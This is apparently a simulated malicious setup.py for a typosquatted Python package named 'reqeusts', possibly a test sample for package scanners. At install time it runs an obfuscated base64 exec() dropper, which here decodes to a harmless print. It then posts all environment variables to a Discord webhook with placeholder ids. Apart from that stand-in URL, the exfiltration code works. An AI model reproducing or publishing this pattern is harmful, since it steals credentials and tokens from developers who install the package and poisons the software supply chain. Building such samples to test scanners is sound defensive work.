import base64
import os
import requests
from setuptools import setup

# Simulated dropper. Decodes to: print('simulated payload')
exec(base64.b64decode("cHJpbnQoJ3NpbXVsYXRlZCBwYXlsb2FkJyk="))
requests.post("https://discord.com/api/webhooks/000/simulated", json=dict(os.environ))

setup(name="reqeusts", version="2.31.1", packages=["evilpkg"])
